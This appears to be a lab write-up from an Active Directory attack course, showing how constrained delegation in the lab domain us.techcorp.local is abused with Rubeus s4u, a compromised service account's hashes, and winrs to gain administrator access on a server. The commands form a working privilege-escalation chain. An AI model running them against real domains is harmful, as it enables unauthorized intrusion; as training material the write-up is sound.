# Hands-on 12: Constrained Delegation

- [Hands-on 12: Constrained Delegation](#hands-on-12-constrained-delegation)
  - [Task](#task)
  - [Abuse Constrained delegation in us.techcorp.local to escalate privileges on a machine to Domain Admin](#abuse-constrained-delegation-in-ustechcorplocal-to-escalate-privileges-on-a-machine-to-domain-admin)

---

## Task

- Abuse Constrained delegation in `us.techcorp.local` to escalate privileges on a machine to Domain Admin.

<br/>

---

## Abuse Constrained delegation in us.techcorp.local to escalate privileges on a machine to Domain Admin

Import AD Module:

```
Import-Module C:\AD\Tools\ADModule-master\Microsoft.ActiveDirectory.Management.dll; Import-Module C:\AD\Tools\ADModule-master\ActiveDirectory\ActiveDirectory.psd1
```

<br/>

Enumerte computer / user with Unconstrained Delegation:

```
Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo
```

![picture 17](images/9c46a72893f19632fc07d8b1c9c5eb4864d577779ffba6a885415dd4fa2b245b.png)  

- `us\appsvc` has Constrained Delegation

<br/>

In [Hands-On 10](l10-Exchange.md), we have compromised `us\appsvc` credential:

Note:
`us\appsvc`
- Password: ?
- AES256: `b4cb0430da8176ec6eae2002dfa86a8c6742e5a88448f1c2d6afc3781e114335`
- NTLM: `1d49d390ac01d568f0ee9be82bb74d4c`

<br/>

Use **Rubeus.exe** to request TGT and TGS on `us-mssql`:

```
.\Rubeus.exe s4u /user:appsvc /aes256:b4cb0430da8176ec6eae2002dfa86a8c6742e5a88448f1c2d6afc3781e114335 /impersonateuser:administrator /msdsspn:CIFS/us-mssql.us.techcorp.local /altservice:HTTP /domain:us.techcorp.local /ptt
```

![picture 18](images/1be3ecd428b34f9dc7c0b9504c1a95bb7b71b6e9b4aa25dda4d88389da08e294.png)  

![picture 19](images/b38e4d6ce77988d6167ec58f5e5a93e9aa1f709db3c5f3e3b0215e3adc2a279b.png)  

<br/>

Try to access `us-mssql`:

```
winrs -r:us-mssql.us.techcorp.local cmd.exe
```

![picture 21](images/f0c279fca4938abf8a0792ffcd352e5490abe4399dd9e06305a561ee70bb7a4f.png)  
 

- As shown, we can access `us-mssql` as `us\administrator`.